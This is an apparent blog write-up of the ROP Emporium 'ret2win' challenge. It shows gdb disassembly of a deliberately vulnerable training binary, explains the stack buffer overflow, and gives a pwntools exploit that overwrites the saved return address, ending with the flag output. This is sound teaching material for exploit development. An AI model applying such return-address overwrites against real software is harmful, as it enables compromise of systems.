I"d<blockquote>
  <p>Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.</p>
</blockquote>

<p>The binaries for the challenges can be downloaded from the author`s website <a href="https://ropemporium.com">ropemporium</a>.The goal of first challenge is to call the <strong>ret2win</strong> function.</p>

<p>After downloading the binary, the first is to check binary protection enabled on the binary using <code class="language-plaintext highlighter-rouge">checksec</code> utility.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>vx@archie:ret2win<span class="nv">$ </span>checksec <span class="nt">--file</span> ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Only <strong>NX</strong> (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like <code class="language-plaintext highlighter-rouge">shellcode</code>. Toe analyze the behavior of the program we will use <code class="language-plaintext highlighter-rouge">gdb</code>. gdb is a tool that enables one to inspect the behavior of binaries at runtime.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td> --><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">info</span> <span class="nv">functions</span>
<span class="nf">All</span> <span class="nv">defined</span> <span class="nv">functions</span><span class="p">:</span>

<span class="nf">Non</span><span class="o">-</span><span class="nv">debugging</span> <span class="nv">symbols</span><span class="p">:</span>
<span class="err">0</span><span class="nf">x0000000000400528</span>  <span class="nv">_init</span>
<span class="err">0</span><span class="nf">x0000000000400550</span>  <span class="nv">puts@plt</span>
<span class="err">0</span><span class="nf">x0000000000400560</span>  <span class="nv">system@plt</span>
<span class="err">0</span><span class="nf">x0000000000400570</span>  <span class="nv">printf@plt</span>
<span class="err">0</span><span class="nf">x0000000000400580</span>  <span class="nv">memset@plt</span>
<span class="err">0</span><span class="nf">x0000000000400590</span>  <span class="nv">read@plt</span>
<span class="err">0</span><span class="nf">x00000000004005a0</span>  <span class="nv">setvbuf@plt</span>
<span class="err">0</span><span class="nf">x00000000004005b0</span>  <span class="nv">_start</span>
<span class="err">0</span><span class="nf">x00000000004005e0</span>  <span class="nv">_dl_relocate_static_pie</span>
<span class="err">0</span><span class="nf">x00000000004005f0</span>  <span class="nv">deregister_tm_clones</span>
<span class="err">0</span><span class="nf">x0000000000400620</span>  <span class="nv">register_tm_clones</span>
<span class="err">0</span><span class="nf">x0000000000400660</span>  <span class="nv">__do_global_dtors_aux</span>
<span class="err">0</span><span class="nf">x0000000000400690</span>  <span class="nv">frame_dummy</span>
<span class="err">0</span><span class="nf">x0000000000400697</span>  <span class="nv">main</span>
<span class="err">0</span><span class="nf">x00000000004006e8</span>  <span class="nv">pwnme</span>
<span class="err">0</span><span class="nf">x0000000000400756</span>  <span class="nv">ret2win</span>
<span class="err">0</span><span class="nf">x0000000000400780</span>  <span class="nv">__libc_csu_init</span>
<span class="err">0</span><span class="nf">x00000000004007f0</span>  <span class="nv">__libc_csu_fini</span>
<span class="err">0</span><span class="nf">x00000000004007f4</span>  <span class="nv">_fini</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The binary has various functions has as shown in the output above.For initial analysis we start at the <code class="language-plaintext highlighter-rouge">main</code> function which is the entrypoint of our program.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td> --><td class="rouge-code"><pre><span class="err">(</span><span class="nf">No</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span> <span class="nv">in</span> <span class="nv">ret2win</span><span class="p">)</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">main</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x0000000000400697</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x0000000000400698</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
   <span class="err">0</span><span class="nf">x000000000040069b</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x2009b6</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x601058</span> <span class="o">&lt;</span><span class="nv">stdout@@GLIBC_2.2.5</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x00000000004006a2</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ecx</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x00000000004006a7</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x2</span>
   <span class="err">0</span><span class="nf">x00000000004006ac</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">esi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x00000000004006b1</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rax</span>
   <span class="err">0</span><span class="nf">x00000000004006b4</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x4005a0</span> <span class="o">&lt;</span><span class="nv">setvbuf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x00000000004006b9</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400808</span>
   <span class="err">0</span><span class="nf">x00000000004006be</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x00000000004006c3</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400820</span>
   <span class="err">0</span><span class="nf">x00000000004006c8</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x00000000004006cd</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x00000000004006d2</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x4006e8</span> <span class="o">&lt;</span><span class="nv">pwnme</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x00000000004006d7</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400828</span>
   <span class="err">0</span><span class="nf">x00000000004006dc</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x00000000004006e1</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x00000000004006e6</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x00000000004006e7</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>From the initial analysis of the main function,main call an interesting function called <strong>pwnme</strong>. Next is to disassemble <strong>pwnme</strong> function to understand the behavior.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td> --><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">pwnme</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">pwnme</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00000000004006e8</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x00000000004006e9</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x20</span>
   <span class="err">0</span><span class="nf">x00000000004006f0</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x00000000004006f4</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x20</span>
   <span class="err">0</span><span class="nf">x00000000004006f9</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">esi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x00000000004006fe</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rax</span>
   <span class="err">0</span><span class="nf">x0000000000400701</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400580</span> <span class="o">&lt;</span><span class="nv">memset@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400706</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400838</span>
   <span class="err">0</span><span class="nf">x000000000040070b</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400710</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400898</span>
   <span class="err">0</span><span class="nf">x0000000000400715</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x000000000040071a</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x4008b8</span>
   <span class="err">0</span><span class="nf">x000000000040071f</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400724</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400918</span>
   <span class="err">0</span><span class="nf">x0000000000400729</span> <span class="o">&lt;+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x000000000040072e</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400570</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400733</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x0000000000400737</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x38</span>
   <span class="err">0</span><span class="nf">x000000000040073c</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="nb">rax</span>
   <span class="err">0</span><span class="nf">x000000000040073f</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x0000000000400744</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400590</span> <span class="o">&lt;</span><span class="nv">read@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400749</span> <span class="o">&lt;+</span><span class="mi">97</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x40091b</span>
   <span class="err">0</span><span class="nf">x000000000040074e</span> <span class="o">&lt;+</span><span class="mi">102</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400753</span> <span class="o">&lt;+</span><span class="mi">107</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">nop</span>
   <span class="err">0</span><span class="nf">x0000000000400754</span> <span class="o">&lt;+</span><span class="mi">108</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">leave</span>
   <span class="err">0</span><span class="nf">x0000000000400755</span> <span class="o">&lt;+</span><span class="mi">109</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>From analysis of the above assembly code, we fill a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values present memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.</p>

<p><img src="/assets/images/ropemporium/stack.png" alt="" /></p>

<p>Next function is <strong>read</strong> function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we are reading 0x38 bytes from the user input and storing it in our buffer.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span> <span class="mh">0x38</span><span class="p">)</span> <span class="c1">//0 is file descriptor stdin</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Because we are reading more than what the buffer can hold, we corrupt the adjacent memory regions therefore causing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image above is to fill the buffer, overwrite the <code class="language-plaintext highlighter-rouge">rbp</code> register and control the return address with <strong>ret2win</strong> function address.</p>

<p>The exploit code for this ret2win function is,</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td> --><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s">"latin-1"</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">warnings</span><span class="p">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'./ret2win'</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">32</span> <span class="c1"># fill the buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>  <span class="c1">#overwrite saved base pointer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400756</span><span class="p">)</span>  <span class="c1">#Address of ret2win function
</span><span class="n">io</span><span class="p">.</span><span class="n">writeafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">clean</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running the above script we get correct flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>vx@archie:ret2win<span class="nv">$ </span>python3 x.py
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./ret2win'</span>: pid 45427
<span class="o">[</span><span class="k">*</span><span class="o">]</span>  Thank you!
    Well <span class="k">done</span><span class="o">!</span> Here<span class="s1">'s your flag:
    ROPE{a_placeholder_32byte_flag!}
[*] Process '</span>./ret2win<span class="s1">' stopped with exit code 0 (pid 45427)
</span></pre></td></tr></tbody></table></code></pre></div></div>
:ET